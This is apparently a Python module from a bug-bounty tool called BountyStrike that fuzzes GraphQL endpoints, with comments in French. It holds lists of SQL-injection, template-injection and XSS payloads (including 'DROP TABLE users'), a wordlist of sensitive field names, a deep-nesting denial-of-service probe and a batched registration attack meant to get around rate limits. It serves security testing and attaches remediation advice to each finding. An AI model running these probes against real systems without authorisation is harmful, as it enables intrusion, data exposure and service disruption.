"""Fuzzer GraphQL avancé pour BountyStrike."""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Any

import requests

from .utils import Finding, get_base_url, normalize_url, safe_request

GRAPHQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "\" OR \"1\"=\"1",
    "1; DROP TABLE users--",
    "{{7*7}}",
    "${7*7}",
    "<script>alert(1)</script>",
    "null",
    "undefined",
    "true",
    "false",
    "0",
    "-1",
    "999999999",
    "admin'--",
    "1 UNION SELECT NULL--",
]

GRAPHQL_FIELD_WORDLIST = [
    "user", "users", "admin", "admins", "account", "accounts",
    "password", "passwords", "secret", "secrets", "token", "tokens",
    "apiKey", "api_key", "private", "internal", "config", "configuration",
    "settings", "profile", "profiles", "email", "emails", "phone",
    "address", "creditCard", "credit_card", "ssn", "salary", "role",
    "roles", "permission", "permissions", "group", "groups", "member",
    "members", "order", "orders", "payment", "payments", "invoice",
    "invoices", "transaction", "transactions", "log", "logs", "audit",
    "debug", "test", "staging", "backup", "dump", "export", "import",
    "delete", "remove", "create", "update", "insert", "modify",
    "upload", "download", "file", "files", "document", "documents",
    "message", "messages", "notification", "notifications", "webhook",
    "session", "sessions", "cookie", "cookies", "auth", "oauth",
    "login", "register", "signup", "reset", "forgot", "verify",
    "me", "self", "currentUser", "viewer", "node", "nodes", "allUsers",
    "listUsers", "getUser", "findUser", "searchUsers", "adminPanel",
    "dashboard", "statistics", "metrics", "health", "status", "version",
    "environment", "env", "database", "db", "query", "mutation",
    "subscription", "schema", "introspection", "__schema", "__type",
]


class GraphQLFuzzer:
    """Fuzzing GraphQL — champs, injections, accès non autorisé."""

    def __init__(self, target: str, session: requests.Session, endpoints: list[str] | None = None):
        self.target = normalize_url(target)
        self.base_url = get_base_url(self.target)
        self.session = session
        self.endpoints = endpoints or self._discover_endpoints()
        self.findings: list[Finding] = []

    def run_full_scan(self) -> list[Finding]:
        """Lance tous les tests de fuzzing GraphQL."""
        if not self.endpoints:
            return self.findings

        for endpoint in self.endpoints:
            self._fuzz_field_names(endpoint)
            self._fuzz_argument_injection(endpoint)
            self._fuzz_variable_injection(endpoint)
            self._test_nested_query_dos(endpoint)
            self._test_union_injection(endpoint)
            self._test_batch_mutation_attack(endpoint)

        return self.findings

    def _discover_endpoints(self) -> list[str]:
        """Découvre les endpoints GraphQL."""
        paths = ["/graphql", "/api/graphql", "/v1/graphql", "/gql", "/query"]
        found = []
        for path in paths:
            url = f"{self.base_url}{path}"
            resp = safe_request(
                self.session, "POST", url,
                json={"query": "{ __typename }"},
                headers={"Content-Type": "application/json"},
            )
            if resp and resp.status_code in (200, 400) and ("__typename" in resp.text or "errors" in resp.text):
                found.append(url)
        return found

    def _gql_request(self, endpoint: str, query: str, variables: dict | None = None) -> requests.Response | None:
        payload: dict[str, Any] = {"query": query}
        if variables:
            payload["variables"] = variables
        return safe_request(
            self.session, "POST", endpoint,
            json=payload,
            headers={"Content-Type": "application/json"},
        )

    def _fuzz_field_names(self, endpoint: str) -> None:
        """Brute-force de noms de champs GraphQL."""
        discovered_fields: list[str] = []

        for field in GRAPHQL_FIELD_WORDLIST[:40]:
            query = f"{{ {field} {{ __typename }} }}"
            resp = self._gql_request(endpoint, query)
            if not resp:
                continue

            try:
                data = resp.json()
                if data.get("data") and data["data"].get(field) is not None:
                    discovered_fields.append(field)
                    severity = "high" if any(
                        s in field.lower() for s in ("admin", "password", "secret", "token", "private")
                    ) else "medium"
                    self.findings.append(
                        Finding(
                            title=f"Champ GraphQL accessible: {field}",
                            severity=severity,
                            category="GraphQL Fuzzing",
                            url=endpoint,
                            description=f"Champ '{field}' accessible sans authentification apparente",
                            evidence=resp.text[:200],
                            remediation="Restreindre l'accès aux champs sensibles",
                        )
                    )
                elif "errors" in data:
                    errors = str(data["errors"])
                    if "did you mean" in errors.lower():
                        suggestions = re.findall(r'"([^"]+)"', errors)
                        for sug in suggestions[:3]:
                            if sug not in discovered_fields:
                                discovered_fields.append(sug)
                                self.findings.append(
                                    Finding(
                                        title=f"Suggestion GraphQL: {sug}",
                                        severity="info",
                                        category="GraphQL Fuzzing",
                                        url=endpoint,
                                        description=f"Champ suggéré par le serveur: {sug}",
                                        evidence=errors[:200],
                                    )
                                )
            except (json.JSONDecodeError, KeyError):
                pass

    def _fuzz_argument_injection(self, endpoint: str) -> None:
        """Injection dans les arguments GraphQL."""
        injection_queries = [
            'query { user(id: "%s") { id name email } }',
            'query { search(q: "%s") { results } }',
            'mutation { login(email: "%s", password: "test") { token } }',
            'query { node(id: "%s") { ... on User { email } } }',
        ]

        for query_template in injection_queries:
            for payload in GRAPHQL_INJECTION_PAYLOADS[:8]:
                query = query_template % payload
                resp = self._gql_request(endpoint, query)
                if not resp:
                    continue

                body = resp.text.lower()
                sql_errors = ["sql syntax", "mysql", "postgresql", "sqlite", "ora-"]
                if any(err in body for err in sql_errors):
                    self.findings.append(
                        Finding(
                            title="SQL Injection dans GraphQL",
                            severity="critical",
                            category="GraphQL Injection",
                            url=endpoint,
                            description="Erreur SQL dans réponse GraphQL",
                            evidence=f"Payload: {payload}, Query: {query[:100]}",
                            remediation="Utiliser des requêtes paramétrées pour GraphQL resolvers",
                        )
                    )
                    return

                if "49" in resp.text and "{{7*7}}" in payload:
                    self.findings.append(
                        Finding(
                            title="SSTI dans GraphQL",
                            severity="critical",
                            category="GraphQL Injection",
                            url=endpoint,
                            description="Expression template évaluée dans GraphQL",
                            evidence=f"Payload: {payload}",
                            remediation="Sanitiser les entrées GraphQL",
                        )
                    )

    def _fuzz_variable_injection(self, endpoint: str) -> None:
        """Injection via variables GraphQL."""
        queries_with_vars = [
            ("query GetUser($id: ID!) { user(id: $id) { email } }", "id"),
            ("query Search($q: String!) { search(query: $q) { results } }", "q"),
            ("mutation Login($email: String!, $pass: String!) { login(email: $email, password: $pass) { token } }", "email"),
        ]

        for query, var_name in queries_with_vars:
            for payload in GRAPHQL_INJECTION_PAYLOADS[:5]:
                resp = self._gql_request(endpoint, query, {var_name: payload})
                if not resp:
                    continue
                if resp.status_code == 200:
                    try:
                        data = resp.json()
                        if data.get("data") and not data.get("errors"):
                            self.findings.append(
                                Finding(
                                    title=f"Variable GraphQL '{var_name}' accepte injection",
                                    severity="high",
                                    category="GraphQL Injection",
                                    url=endpoint,
                                    description=f"Variable {var_name}={payload} traitée sans erreur",
                                    evidence=resp.text[:200],
                                    remediation="Valider les types et valeurs des variables GraphQL",
                                )
                            )
                    except json.JSONDecodeError:
                        pass

    def _test_nested_query_dos(self, endpoint: str) -> None:
        """Test DoS par requêtes imbriquées."""
        nested = "user { friends { friends { friends { friends { name } } } } }"
        deep_query = f"{{ {nested} }}"
        resp = self._gql_request(endpoint, deep_query)
        if resp and resp.status_code == 200:
            try:
                data = resp.json()
                if data.get("data") and not data.get("errors"):
                    self.findings.append(
                        Finding(
                            title="Pas de limite de profondeur GraphQL (DoS)",
                            severity="medium",
                            category="GraphQL Fuzzing",
                            url=endpoint,
                            description="Requêtes imbriquées profondes acceptées",
                            remediation="Limiter la profondeur des requêtes (max depth: 5-10)",
                        )
                    )
            except json.JSONDecodeError:
                pass

    def _test_union_injection(self, endpoint: str) -> None:
        """Test union/splice dans les requêtes GraphQL."""
        union_queries = [
            "{ user(id: 1) { name } } { admin { password } }",
            "{ __schema { types { name fields { name } } } } { users { email password } }",
        ]
        for query in union_queries:
            resp = self._gql_request(endpoint, query)
            if not resp:
                continue
            try:
                data = resp.json()
                if data.get("data"):
                    keys = list(data["data"].keys()) if isinstance(data["data"], dict) else []
                    if len(keys) > 1 or "admin" in str(data).lower():
                        self.findings.append(
                            Finding(
                                title="Requête GraphQL multiple acceptée",
                                severity="medium",
                                category="GraphQL Fuzzing",
                                url=endpoint,
                                description="Le serveur accepte des requêtes multiples/union",
                                evidence=query[:150],
                                remediation="Limiter à une opération par requête",
                            )
                        )
            except (json.JSONDecodeError, AttributeError):
                pass

    def _test_batch_mutation_attack(self, endpoint: str) -> None:
        """Test batch de mutations pour bypass rate limit."""
        batch = [
            {"query": f'mutation {{ register(email: "test{i}@evil.com", password: "pass") {{ id }} }}'}
            for i in range(10)
        ]
        resp = safe_request(
            self.session, "POST", endpoint,
            json=batch,
            headers={"Content-Type": "application/json"},
        )
        if resp:
            try:
                data = resp.json()
                if isinstance(data, list) and len(data) >= 5:
                    successes = sum(1 for r in data if r.get("data") and not r.get("errors"))
                    if successes >= 3:
                        self.findings.append(
                            Finding(
                                title="Batch mutations GraphQL — bypass rate limit",
                                severity="high",
                                category="GraphQL Fuzzing",
                                url=endpoint,
                                description=f"{successes}/10 mutations batchées réussies",
                                evidence=f"Batch size: {len(data)}",
                                remediation="Limiter le batching et implémenter rate limiting",
                            )
                        )
            except json.JSONDecodeError:
                pass
